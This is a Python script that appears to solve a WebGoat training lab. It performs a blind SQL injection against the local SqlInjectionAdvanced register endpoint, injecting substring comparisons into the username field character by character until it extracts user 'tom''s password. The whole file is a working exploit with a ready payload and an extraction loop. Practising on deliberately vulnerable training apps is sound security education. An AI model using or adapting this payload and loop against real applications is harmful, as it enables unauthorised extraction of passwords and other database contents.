import requests
import urllib.parse

URL = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/register"
COOKIE = {'JSESSIONID': 'EFFB385BBF7C53A06493297C10CA02D8'}

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# The set of characters to test (adjust as needed)
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@#&"
max_length = 50  # adjust based on expected password length

def test_char(pos, ch):
    # Craft the injection payload
    # injection = f"tom' AND substring(password,{pos},1)='{ch}' -- "
    injection = f"tom'+and+substring(password,{pos},1)+between+'{ch}'+and+'{ch}'%3B--"

    form_data = (
        f"username_reg={injection}&"
        "email_reg=abc%40gmail.com&"
        "password_reg=1234&"
        "confirm_password_reg=1234"
    )
    
    response = requests.put(URL, data=form_data, headers=HEADERS, cookies=COOKIE)
    
    # Success if feedback mentions the injected value already exists
    return "already exists" in response.text

def extract_password():
    password = ""
    for pos in range(1, max_length + 1):
        found = False
        for ch in charset:
            if test_char(pos, ch):
                password += ch
                print(f"[+] Found char at position {pos}: {ch}")
                found = True
                break
        if not found:
            print(f"[!] No match at position {pos}. Password likely ends here.")
            break
    print(f"\n[✓] Extracted password: {password}")

if __name__ == "__main__":
    extract_password()

